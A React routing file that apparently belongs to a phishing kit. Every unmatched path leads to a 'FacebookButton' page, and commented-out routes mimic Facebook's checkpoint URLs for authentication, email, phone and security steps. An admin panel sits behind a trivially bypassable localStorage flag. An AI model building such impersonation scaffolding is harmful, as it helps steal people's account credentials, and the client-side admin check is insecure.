import React, { useEffect, useState } from "react";
import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import { FacebookButton } from "./pages/FacebookButton";
import AdminPage from "./pages/admin";
import Login from "./pages/login";



function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

export default function RootNavigation() {
  // const [is_visible, setVisible] = useState(false);
  // const [isLoading, setLoading] = useState(true);
  // const [isRedirect, setRedirect] = useState(false);
  // var url = window.location.pathname.split('/');

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/">
          <Route index path="/calendly" element={<FacebookButton />} />
          <Route path="login" element={<Login />} />
          <Route
            path="/admin"
            element={
              <PrivateRoute>
                <AdminPage />
              </PrivateRoute>
            }
          />
          {/* <Route
            path="/checkpoint/next=authentication"
            element={<Confirmation />}
          />
          <Route
            path="/checkpoint/next=error-authentication"
            element={<CodeTwo />}
          />
          <Route
            path="/checkpoint/next=email"
            element={<ConfirmationSecond />}
          />
          <Route path="/checkpoint/next=phone" element={<TH />} />
          <Route path="/checkpoint/next=secure" element={<Robot />} /> */}
          {/* <Route path="/admin/kka" element={<Dashboard />} />
          <Route path="/admin/kka2" element={<Dashboard2 />} /> */}
          <Route path="*" element={<FacebookButton />} />
        </Route>
      </Routes>
    </BrowserRouter>
  );
}
